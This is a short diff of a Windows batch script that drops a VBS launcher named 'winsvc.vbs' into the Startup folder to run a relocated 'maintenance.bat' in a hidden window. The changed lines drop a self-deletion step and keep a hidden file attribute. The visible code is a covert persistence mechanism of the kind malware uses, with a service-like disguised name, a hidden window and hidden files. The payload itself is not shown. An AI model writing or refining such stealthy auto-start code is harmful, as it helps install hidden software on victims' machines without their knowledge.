@@ -25,9 +25,7 @@ echo WshShell.Run """%target%\maintenance.bat""", 0, True
 echo Set WshShell = Nothing
 ) > "%startup%\winsvc.vbs"
 
-:: Delete self from Startup (so only the VBS remains)
-del "%~f0" >nul
-attrib +h +s "%startup%\winsvc.vbs"
+attrib +h  "%startup%\winsvc.vbs"
 :: Terminate after starting the relocated copy
 cscript //nologo "%startup%\winsvc.vbs"
 exit /b
